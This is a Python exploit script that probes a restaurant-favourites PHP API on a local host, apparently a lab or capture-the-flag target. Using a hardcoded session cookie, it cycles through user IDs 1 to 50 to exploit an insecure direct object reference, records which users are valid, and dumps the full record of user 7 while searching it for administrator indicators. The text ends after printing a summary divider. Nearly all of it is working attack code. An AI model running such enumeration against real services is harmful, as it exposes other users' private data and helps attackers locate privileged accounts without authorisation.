import requests
import json

# Configuration
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"
session_cookie = {'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'}

valid_users = []
admin_account = None

print("[*] Starting IDOR enumeration of user IDs 1-50")
print(f"[*] Target: {base_url}{endpoint}")

# Iterate through user IDs
for user_id in range(1, 51):
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                # Check if response contains restaurant data (indicates valid user)
                if isinstance(data, dict) and 'restaurants' in data:
                    print(f"[+] userId {user_id}: VALID USER - {len(data.get('restaurants', []))} restaurants found")
                    valid_users.append(user_id)
                    
                    # Special handling for userId=7
                    if user_id == 7:
                        username = data.get('username', 'N/A')
                        print(f"\n[!] USERID=7 DETAILS:")
                        print(f"    Username: {username}")
                        print(f"    Restaurants count: {len(data.get('restaurants', []))}")
                        
                        # Extract admin indicators
                        admin_indicators = []
                        for key, value in data.items():
                            if isinstance(value, str) and ('admin' in value.lower() or 'administrator' in value.lower()):
                                admin_indicators.append(f"{key}: {value}")
                            elif isinstance(key, str) and 'admin' in key.lower():
                                admin_indicators.append(f"{key}: {value}")
                        
                        if admin_indicators:
                            print(f"    Admin indicators: {admin_indicators}")
                        
                        print(f"    Full response: {json.dumps(data, indent=2)}")
                        admin_account = {
                            'userId': 7,
                            'username': username,
                            'is_admin': len(admin_indicators) > 0,
                            'data': data
                        }
                else:
                    # Check if it's an error message
                    error_msg = data.get('error', data.get('message', 'Unknown error'))
                    print(f"[-] userId {user_id}: Error - {error_msg}")
                    
            except ValueError:
                print(f"[-] userId {user_id}: Non-JSON response - {response.text[:100]}")
        else:
            print(f"[-] userId {user_id}: HTTP {response.status_code}")
            
    except requests.exceptions.Timeout:
        print(f"[!] userId {user_id}: Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[!] userId {user_id}: Request failed - {e}")

# Print summary
print("\n" + "="*60)
